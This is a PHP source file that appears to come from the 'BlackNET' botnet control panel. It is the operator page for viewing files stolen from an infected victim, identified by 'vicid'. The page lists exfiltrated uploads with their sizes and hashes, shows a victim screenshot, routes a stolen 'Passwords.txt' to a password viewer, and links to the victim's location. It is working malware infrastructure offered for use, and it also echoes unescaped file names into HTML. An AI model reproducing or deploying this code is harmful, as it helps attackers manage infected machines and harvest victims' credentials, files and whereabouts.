<?php
include_once 'session.php';

$vicID = isset($_GET['vicid']) ? $utils->sanitize($_GET['vicid']) : '';
$blacklist = array('..', '.', "index.php", ".htaccess");

$files = null;

if (file_exists("upload/$vicID")) {
    try {
        $files = scandir("upload/$vicID");
    } catch (Exception $e) {
        echo $e->getMessage();
    }
}

function formatBytes($bytes, $precision = 2)
{
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, $precision) . ' ' . $units[$pow];
}
?>

<!DOCTYPE html>
<html>

<head>
  <?php include_once 'components/meta.php';?>
  <title>BlackNET - View Uploads</title>
  <?php include_once 'components/css.php';?>
  <link href="asset/vendor/datatables/dataTables.bootstrap4.css" rel="stylesheet">
</head>

<body id="page-top">
  <?php include_once 'components/header.php';?>
  <div id="wrapper">
    <div id="content-wrapper">
      <div class="container-fluid">
        <ol class="breadcrumb">
          <li class="breadcrumb-item">
            <a href="#">Uploads Folder</a>
          </li>
        </ol>
        <form method="POST" action="rmfile.php">
        <?php echo $utils->show_input("csrf", $utils->sanitize($_SESSION['csrf'])); ?>

        <?php echo $utils->show_input("vicid", $utils->sanitize($_GET['vicid'])); ?>

        <div class="card mb-3">
          <div class="card-header">
            <i class="fas  fa-upload"></i>
            View Uploads</div>
          <div class="card-body">
            <div class="container text-center">
              <div class="container container-special text-left">
                <?php if (isset($_GET['msg'])): ?>
                  <?php if ($_GET['msg'] === "yes"): ?>
                    <?php $utils->show_alert("File has been removed.", "success", "check-circle");?>
                  <?php elseif ($_GET['msg'] === "csrf"): ?>
                    <?php $utils->show_alert("CSRF Token is invalid.", "danger", "times-circle");?>
                  <?php endif;?>
                <?php endif;?>
              </div>

              <?php if (file_exists("upload/$vicID/" . $utils->base64_encode_url($vicID) . ".png")): ?>
                <a href="<?php echo ("upload/$vicID/" . $utils->base64_encode_url($vicID) . ".png"); ?>"><img class="img-fluid rounded border border-secondary" width="60%" height="60%" src="<?php echo ("upload/$vicID/" . $utils->base64_encode_url($vicID) . ".png"); ?>"></a>
              <?php else: ?>
                <img class="img-fluid rounded border border-secondary" src="imgs/placeholder.jpg" width="60%" height="60%">
              <?php endif;?>

              <div class="table-responsive pt-4 pb-4">
                <table class="table table-bordered" id="dataTable" width="100%" cellspacing="0">
                  <thead>
                    <tr>
                      <th><input <?php if (empty($files)) {
    echo "disabled";
}?> type="checkbox" name="select-all" id="select-all"></th>
                      <th>#</th>
                      <th>File Name</th>
                      <th>File Size</th>
                      <th>File Hash</th>
                      <th>Settings</th>
                    </tr>
                  </thead>
                  <tbody>
                    <?php $i = 1;?>
                    <?php if (!(empty($files))): ?>
                      <?php foreach ($files as $file): ?>
                        <?php if (!(in_array($file, $blacklist))): ?>
                          <tr>

                            <td><input type="checkbox" id="file[]" name="file[]" value="<?php echo $file; ?>"></td>

                            <td><?php echo $i; ?></td>

                            <td><?php echo $file; ?></td>

                            <td><?php echo formatBytes(filesize("upload/$vicID/$file")); ?></td>

                            <td><?php echo md5_file("upload/$vicID/$file"); ?></td>
                            <td>
                              <?php if ($file === "Passwords.txt"): ?>
                                <a href="<?php echo ("viewpasswords.php?vicid=$vicID") ?>" class="fas fa-download text-decoration-none"></a>
                              <?php else: ?>
                                <a href="<?php echo ("upload/$vicID/$file") ?>" class="fas fa-download text-decoration-none"></a>
                              <?php endif;?>
                              <a href="rmfile.php?fname=<?php echo ($file) ?>&vicid=<?php echo ($vicID) ?>&csrf=<?php echo ($utils->sanitize($_SESSION['csrf'])) ?>" class="fas fa-trash-alt text-decoration-none"></a>
                            </td>
                          </tr>
                          <?php $i++;?>
                        <?php endif;?>
                      <?php endforeach;?>
                    <?php endif;?>
                  </tbody>
                </table>
              </div>
            </div>
          </div>
          <div class="card-footer">
            <button type="submit" class="btn btn-primary">Delete Files</button>
            <a href="getlocation.php?vicid=<?php echo $vicID; ?>" class="btn btn-primary">View Client Location</a>
          </div>
        </div>
        </form>
      </div>
    </div>
  </div>
  <?php include_once 'components/footer.php';?>

  <?php include_once 'components/js.php';?>

  <script src="asset/vendor/datatables/jquery.dataTables.js"></script>
  <script src="asset/vendor/datatables/dataTables.bootstrap4.js"></script>

  <script>
  $("#dataTable").DataTable({
      ordering: true,

      select: {
        style: "multi",
      },
      order: [[1, "asc"]],
      columnDefs: [
        {
          targets: 0,
          orderable: false,
        },
      ],
    });

    $('#select-all').click(function(event) {
      if (this.checked) {
        $(':checkbox').each(function() {
          this.checked = true;
        });

      } else {

        $(':checkbox').each(function() {
          this.checked = false;
        });
      }
    });
  </script>
</body>

</html>